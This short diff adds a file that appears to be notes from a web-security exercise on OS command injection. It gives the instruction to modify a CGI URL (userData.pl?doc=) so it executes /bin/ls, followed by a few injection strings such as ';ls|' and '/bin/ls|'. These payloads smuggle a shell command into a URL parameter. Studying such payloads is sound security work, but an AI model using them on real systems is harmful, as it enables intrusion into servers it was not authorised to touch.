@@ -1,0 +1,10 @@
+Modify the URL to execute /bin/ls|
+
+http://sensitive/cgi-bin/
+userData.pl?doc=???
+
+;ls|
+;$bash% ls .
+/bin/ls|
+
+> /bin/ls|
